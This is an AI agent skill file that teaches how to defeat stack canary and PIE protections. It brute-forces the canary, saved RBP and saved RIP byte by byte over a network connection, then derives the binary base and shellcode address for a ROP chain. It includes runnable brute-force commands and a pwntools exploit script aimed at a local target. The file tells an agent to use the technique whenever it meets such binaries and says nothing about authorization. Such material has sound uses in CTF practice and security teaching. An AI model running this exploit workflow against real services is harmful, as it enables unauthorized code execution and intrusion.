---
name: bypass-canary-pie
description: How to bypass canary and PIE (Position Independent Executable) protections in binary exploitation. Use this skill whenever you're working with a binary that has both canary and PIE enabled, need to brute-force stack addresses, or want to leak RBP/RIP values to calculate base addresses for ROP chains. Make sure to use this skill when you encounter binaries protected by canary+PIE, need to brute-force return addresses, or want to calculate shellcode positions from leaked stack values.
---

# Bypassing Canary and PIE Protections

This skill helps you bypass binary protections when a target has both **canary** and **PIE (Position Independent Executable)** enabled.

## When to Use This Skill

Use this skill when:
- `checksec` shows a binary has canary and PIE protections
- You need to brute-force stack addresses (canary, RBP, RIP)
- You want to calculate base addresses from leaked values for ROP chains
- You're dealing with a binary that doesn't leak addresses naturally

## Understanding the Protection

When a binary has both canary and PIE:
- **Canary**: A random value placed on the stack that's checked before function return
- **PIE**: The binary loads at a random address each time, making hardcoded addresses useless

> **Note**: `checksec` might not detect canary in statically compiled binaries. Look for a value saved at function start and checked before exit.

## The Brute-Force Approach

To bypass PIE, you need to leak an address. If the binary doesn't leak addresses, brute-force the stack:

1. **Brute-force the canary** (8 bytes on x64)
2. **Brute-force the saved RBP** (next 8 bytes after canary)
3. **Brute-force the saved RIP** (next 8 bytes after RBP)

The stack layout in a vulnerable function looks like:
```
[buffer] [canary: 8 bytes] [saved RBP: 8 bytes] [saved RIP: 8 bytes]
```

## Step-by-Step Process

### Step 1: Brute-Force the Canary

Use the brute-force script to find the canary value:

```bash
python scripts/brute_force_stack.py --target localhost:8788 --canary-offset 1176
```

The script will:
- Send guesses byte-by-byte
- Detect correct bytes when the program outputs something or doesn't crash
- Return the full canary value

### Step 2: Brute-Force RBP and RIP

After getting the canary, continue brute-forcing:

```bash
python scripts/brute_force_stack.py --target localhost:8788 --canary-offset 1176 --continue-rbp-rip
```

This will give you:
- **RBP**: The saved base pointer
- **RIP**: The saved instruction pointer (return address)

### Step 3: Calculate Useful Addresses

From the leaked values, calculate addresses you need:

#### Calculate Shellcode Position

Use RBP to find where your shellcode is in the stack:

```python
# After leaking RBP, calculate shellcode position
INI_SHELLCODE = RBP - offset_to_shellcode
```

To find the offset:
1. Set a breakpoint after leaking RBP in your debugger
2. Check where your shellcode is located
3. Calculate the distance between shellcode and RBP

#### Calculate PIE Base Address

Use RIP to calculate the binary's base address:

```python
# Mask off the last 12 bits (4096 bytes = page size)
elf.address = RIP - (RIP & 0xfff)
```

For example:
- Leaked RIP: `0x562002970ecf`
- Base address: `0x562002970000`

To verify, use `objdump -d vulnerable_binary` and check the disassembly addresses.

### Step 4: Build Your ROP Chain

Now that you have the base address, you can:
1. Calculate addresses of gadgets in the binary
2. Build a valid ROP chain
3. Redirect execution to your shellcode or gadgets

## Important Considerations

### False Positives in Brute-Force

Some addresses might not crash the server even if they're incorrect. To handle this:

1. **Add delays between requests** to the server
2. **Verify multiple times** before accepting a byte as correct
3. **Check for consistent behavior** across multiple attempts

The brute-force script includes a delay parameter:

```bash
python scripts/brute_force_stack.py --target localhost:8788 --delay 0.1
```

### Assumptions

- The return address belongs to the main binary code (usually true if the vulnerability is in the binary)
- You're working with x64 binaries (8-byte values)
- The binary doesn't have ASLR disabled (otherwise PIE bypass isn't needed)

## Example Workflow

```python
from pwn import *
from scripts.brute_force_stack import get_bf

# Connect to target
def connect():
    return remote("localhost", 8788)

# Brute-force canary
canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(connect, base, "SOME OUTPUT")
CANARY = u64(base_canary[len(base_canary)-8:])

# Brute-force RBP
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(connect, base_canary, "SOME OUTPUT")
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])

# Brute-force RIP
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(connect, base_canary_rbp, "SOME OUTPUT")
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])

# Calculate base address
elf.address = RIP - (RIP & 0xfff)

# Calculate shellcode position
INI_SHELLCODE = RBP - 1152

print(f"Canary: {hex(CANARY)}")
print(f"RBP: {hex(RBP)}")
print(f"RIP: {hex(RIP)}")
print(f"Base: {hex(elf.address)}")
print(f"Shellcode at: {hex(INI_SHELLCODE)}")
```

## Next Steps

After bypassing canary and PIE:
1. Use the calculated addresses to build your exploit
2. Create a ROP chain if needed
3. Redirect execution to your payload
4. Test the exploit multiple times to ensure reliability

## References

- [Stack Buffer Overflow Internship Notes](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#extended-brute-force-leaking)
- `checksec` for binary protection analysis
- `objdump -d` for disassembly and address verification
